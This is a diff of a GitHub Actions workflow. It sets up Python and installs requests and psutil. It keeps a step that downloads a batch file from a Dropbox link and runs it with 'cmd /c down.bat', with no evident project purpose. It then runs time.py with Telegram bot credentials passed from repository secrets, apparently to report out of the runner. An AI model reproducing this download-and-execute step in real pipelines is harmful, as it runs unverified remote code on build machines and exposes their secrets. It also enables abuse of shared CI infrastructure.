@@ -9,11 +9,26 @@ jobs:
     timeout-minutes: 120
 
     steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v3
+
+      - name: Set up Python 3.9.7
+        uses: actions/setup-python@v3
+        with:
+          python-version: '3.9.7'
+
+      - name: Install Python Dependencies
+        run: |
+          pip install requests
+          pip install psutil
+
       - name: Downloading & Setting Up
         run: |
-         echo "EMAIL_SECRET=busmaill02@gmail.com" > secrets.txt
-         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/knzijslpfl61m6ujrhh8a/down.bat?rlkey=1uvv9874ss4err14m853ae1zy&dl=1" -OutFile "down.bat"
-         cmd /c down.bat
+          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/knzijslpfl61m6ujrhh8a/down.bat?rlkey=1uvv9874ss4err14m853ae1zy&dl=1" -OutFile "down.bat"
+          cmd /c down.bat
 
-      - name: Time Counter
+      - name: Run Combined Script
+        env:
+          TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
         run: python time.py
